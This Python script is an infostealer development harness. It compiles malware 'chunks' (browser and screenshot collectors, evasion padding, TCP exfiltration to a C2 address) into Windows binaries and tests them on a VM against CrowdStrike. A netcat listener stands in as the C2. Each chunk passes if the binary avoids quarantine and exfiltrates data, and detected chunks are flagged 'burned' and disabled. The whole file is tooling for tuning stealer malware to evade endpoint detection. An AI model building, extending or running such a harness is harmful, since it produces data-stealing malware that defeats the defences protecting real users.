#!/usr/bin/env python3
"""
Chunk Validation Mode - Systematically test chunks against CrowdStrike.

Usage:
    python3 validate.py --recipe infostealer_cs_full_working
    python3 validate.py --category collectors --thorough
    python3 validate.py --chunks collectors/browser_chromium,collectors/screenshot
"""

import argparse
import asyncio
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import yaml

FRAMEWORK_ROOT = Path(__file__).parent
CHUNKS_DIR = FRAMEWORK_ROOT / "templates" / "chunks"
RECIPES_DIR = CHUNKS_DIR / "recipes"
RESULTS_DIR = FRAMEWORK_ROOT / "results"

# VM defaults
VM_HOST = os.environ.get("VM_HOST", "localhost")
VM_PORT = int(os.environ.get("VM_PORT", "10022"))
VM_USER = os.environ.get("VM_USER", "vmuser")
VM_PASS = os.environ.get("VM_PASS", "vmuser123")
C2_PORT = int(os.environ.get("C2_PORT", "9001"))

# Baseline working chunks (proven to work with CrowdStrike)
BASELINE_CHUNKS = [
    "collectors/system_info_api",
    "collectors/processes_api",
    "collectors/env_vars",
]


def ssh_cmd(cmd: str, timeout: int = 30) -> tuple[int, str]:
    """Execute SSH command on VM."""
    full_cmd = f"sshpass -p '{VM_PASS}' ssh -o StrictHostKeyChecking=no -p {VM_PORT} {VM_USER}@{VM_HOST} \"{cmd}\""
    try:
        result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout.strip().replace('\r', '')
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def scp_upload(local_path: str, remote_path: str) -> bool:
    """Upload file to VM."""
    cmd = f"sshpass -p '{VM_PASS}' scp -o StrictHostKeyChecking=no -P {VM_PORT} {local_path} {VM_USER}@{VM_HOST}:'{remote_path}'"
    result = subprocess.run(cmd, shell=True, capture_output=True)
    return result.returncode == 0


def start_c2_listener(port: int, output_file: str, timeout: int = 45) -> subprocess.Popen:
    """Start netcat listener in background."""
    subprocess.run(f"fuser -k {port}/tcp 2>/dev/null", shell=True)
    time.sleep(0.5)
    proc = subprocess.Popen(
        f"timeout {timeout} nc -l -p {port} > {output_file}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(1)
    return proc


def build_test_recipe(base_recipe: dict, test_chunks: list[str], output_path: Path) -> None:
    """Create a test recipe with specific chunks."""
    recipe = {
        "name": "validation_test",
        "description": "Chunk validation test recipe",
        "core": base_recipe.get("core", ["core/emit_buffer", "core/run_cmd", "core/file_ops"]),
        "collectors": test_chunks,
        "exfil": base_recipe.get("exfil", "exfil/tcp_dynamic"),
        "arch": base_recipe.get("arch", "arch/sequential"),
        "resources": True,
        "evasion": base_recipe.get("evasion", ["evasion/iat_pad"]),
        "vars": base_recipe.get("vars", {"C2_IP": "10.0.2.2", "C2_PORT": "9001"}),
    }
    with open(output_path, "w") as f:
        yaml.dump(recipe, f)


def compile_recipe(recipe_path: Path, output_dir: Path) -> tuple[bool, Path | None]:
    """Compile a recipe and return (success, exe_path)."""
    sys.path.insert(0, str(CHUNKS_DIR))
    from assembler import assemble, compile_mingw

    source_path = output_dir / "test.c"
    exe_path = output_dir / "test.exe"

    try:
        source = assemble(str(recipe_path), skip_disabled=False)
        source_path.write_text(source)

        success = compile_mingw(str(source_path), str(exe_path))
        if success and exe_path.exists():
            return True, exe_path
        return False, None
    except Exception as e:
        print(f"  Compile error: {e}", file=sys.stderr)
        return False, None


def test_chunk(chunk_ref: str, base_recipe: dict, work_dir: Path) -> dict:
    """
    Test a single chunk against CrowdStrike.

    Returns: {
        "chunk": chunk_ref,
        "result": "pass" | "fail_static" | "fail_behavioral" | "fail_compile" | "fail_crash",
        "exfil_bytes": int,
        "binary_survived": bool,
        "details": str
    }
    """
    print(f"  Testing: {chunk_ref}")

    # Build test recipe with baseline + test chunk
    test_chunks = BASELINE_CHUNKS.copy()
    if chunk_ref not in test_chunks:
        test_chunks.append(chunk_ref)

    recipe_path = work_dir / "test_recipe.yaml"
    build_test_recipe(base_recipe, test_chunks, recipe_path)

    # Compile
    success, exe_path = compile_recipe(recipe_path, work_dir)
    if not success:
        return {
            "chunk": chunk_ref,
            "result": "fail_compile",
            "exfil_bytes": 0,
            "binary_survived": False,
            "details": "Compilation failed"
        }

    # Clean VM
    ssh_cmd("del C:\\Users\\vmuser\\Desktop\\test.exe 2>nul")

    # Upload
    remote_path = f"C:\\Users\\{VM_USER}\\Desktop\\test.exe"
    if not scp_upload(str(exe_path), remote_path):
        return {
            "chunk": chunk_ref,
            "result": "fail_upload",
            "exfil_bytes": 0,
            "binary_survived": False,
            "details": "Upload failed"
        }

    # Check if binary survived upload (static detection)
    time.sleep(2)
    _, exists = ssh_cmd(f"if exist {remote_path} (echo EXISTS) else (echo GONE)")
    if "GONE" in exists:
        return {
            "chunk": chunk_ref,
            "result": "fail_static",
            "exfil_bytes": 0,
            "binary_survived": False,
            "details": "Binary quarantined on upload (static detection)"
        }

    # Start C2 listener
    exfil_file = work_dir / "exfil.bin"
    c2_proc = start_c2_listener(C2_PORT, str(exfil_file), timeout=45)

    # Execute
    ssh_cmd(f"{remote_path}", timeout=5)

    # Wait for exfil
    time.sleep(20)
    c2_proc.terminate()
    c2_proc.wait()

    # Check results
    exfil_bytes = exfil_file.stat().st_size if exfil_file.exists() else 0

    # Check if binary still exists
    _, exists = ssh_cmd(f"if exist {remote_path} (echo EXISTS) else (echo GONE)")
    binary_survived = "EXISTS" in exists

    # Determine result
    if exfil_bytes > 100 and binary_survived:
        result = "pass"
        details = f"Exfiltrated {exfil_bytes} bytes, binary survived"
    elif exfil_bytes == 0 and not binary_survived:
        result = "fail_static"
        details = "Binary quarantined post-execution (delayed static detection)"
    elif exfil_bytes == 0 and binary_survived:
        result = "fail_behavioral"
        details = "Binary survived but no exfil (behavioral detection or crash)"
    elif exfil_bytes > 0 and not binary_survived:
        result = "fail_behavioral"
        details = f"Partial exfil ({exfil_bytes} bytes) but binary quarantined"
    else:
        result = "fail_crash"
        details = f"Unexpected state: {exfil_bytes} bytes, survived={binary_survived}"

    # Cleanup
    ssh_cmd(f"del {remote_path} 2>nul")

    return {
        "chunk": chunk_ref,
        "result": result,
        "exfil_bytes": exfil_bytes,
        "binary_survived": binary_survived,
        "details": details
    }


def validate_chunks(chunks: list[str], base_recipe: dict, thorough: bool = False) -> list[dict]:
    """
    Validate a list of chunks.

    If thorough=False, uses bisection to find failures faster.
    If thorough=True, tests each chunk individually.
    """
    results = []

    with tempfile.TemporaryDirectory() as work_dir:
        work_path = Path(work_dir)

        if thorough:
            # Test each chunk individually
            for chunk in chunks:
                result = test_chunk(chunk, base_recipe, work_path)
                results.append(result)
                status = "✓" if result["result"] == "pass" else "✗"
                print(f"    {status} {chunk}: {result['result']} ({result['details']})")
        else:
            # Bisection approach
            # First test all chunks together
            print("  Testing all chunks together...")
            all_chunks = BASELINE_CHUNKS + [c for c in chunks if c not in BASELINE_CHUNKS]
            recipe_path = work_path / "all_recipe.yaml"
            build_test_recipe(base_recipe, all_chunks, recipe_path)

            success, exe_path = compile_recipe(recipe_path, work_path)
            if not success:
                print("  All-chunk build failed, testing individually...")
                return validate_chunks(chunks, base_recipe, thorough=True)

            # Quick test
            # ... (simplified - just test individually for now)
            return validate_chunks(chunks, base_recipe, thorough=True)

    return results


def update_registry(results: list[dict]) -> None:
    """Update chunk registry based on validation results."""
    sys.path.insert(0, str(CHUNKS_DIR))
    from registry import set_chunk_status, load_registry

    registry = load_registry()

    for r in results:
        chunk = r["chunk"]
        if r["result"] == "pass":
            set_chunk_status(chunk, "enabled", registry=registry)
        elif r["result"] in ("fail_static", "fail_behavioral"):
            reason = r["details"]
            tags = ["burned"]
            if "behavioral" in r["result"]:
                tags.append("behavioral")
            set_chunk_status(chunk, "disabled", reason=reason, tags=tags, registry=registry)


def get_chunks_by_category(category: str) -> list[str]:
    """Get all chunks in a category."""
    category_dir = CHUNKS_DIR / category
    if not category_dir.exists():
        return []
    return [f"{category}/{f.stem}" for f in category_dir.glob("*.c")]


def main():
    parser = argparse.ArgumentParser(description="Validate chunks against CrowdStrike")
    parser.add_argument("--recipe", help="Base recipe to use for validation")
    parser.add_argument("--category", help="Test all chunks in category (collectors, evasion, exfil)")
    parser.add_argument("--chunks", help="Comma-separated list of specific chunks to test")
    parser.add_argument("--thorough", action="store_true", help="Test each chunk individually (slower)")
    parser.add_argument("--update-registry", action="store_true", help="Update registry with results")
    parser.add_argument("--dry-run", action="store_true", help="Show what would be tested without running")
    args = parser.parse_args()

    # Load base recipe
    if args.recipe:
        recipe_path = RECIPES_DIR / f"{args.recipe}.yaml"
        if not recipe_path.exists():
            print(f"Recipe not found: {recipe_path}")
            sys.exit(1)
        with open(recipe_path) as f:
            base_recipe = yaml.safe_load(f)
    else:
        base_recipe = {
            "core": ["core/emit_buffer", "core/run_cmd", "core/file_ops"],
            "exfil": "exfil/tcp_dynamic",
            "arch": "arch/sequential",
            "evasion": ["evasion/iat_pad"],
            "vars": {"C2_IP": "10.0.2.2", "C2_PORT": "9001"},
        }

    # Determine chunks to test
    chunks_to_test = []
    if args.chunks:
        chunks_to_test = [c.strip() for c in args.chunks.split(",")]
    elif args.category:
        chunks_to_test = get_chunks_by_category(args.category)
    else:
        # Default: test all collectors
        chunks_to_test = get_chunks_by_category("collectors")

    if not chunks_to_test:
        print("No chunks to test")
        sys.exit(1)

    print(f"Chunks to validate: {len(chunks_to_test)}")
    for c in chunks_to_test:
        print(f"  - {c}")

    if args.dry_run:
        print("\nDry run - not executing tests")
        sys.exit(0)

    print("\n" + "=" * 60)
    print("CHUNK VALIDATION")
    print("=" * 60 + "\n")

    results = validate_chunks(chunks_to_test, base_recipe, thorough=args.thorough)

    # Summary
    print("\n" + "=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)

    passed = [r for r in results if r["result"] == "pass"]
    failed = [r for r in results if r["result"] != "pass"]

    print(f"\nPassed: {len(passed)}/{len(results)}")
    for r in passed:
        print(f"  ✓ {r['chunk']}")

    if failed:
        print(f"\nFailed: {len(failed)}/{len(results)}")
        for r in failed:
            print(f"  ✗ {r['chunk']}: {r['result']}")
            print(f"      {r['details']}")

    # Update registry if requested
    if args.update_registry and not args.dry_run:
        print("\nUpdating registry...")
        update_registry(results)
        print("Registry updated")

    # Exit code
    sys.exit(0 if not failed else 1)


if __name__ == "__main__":
    main()
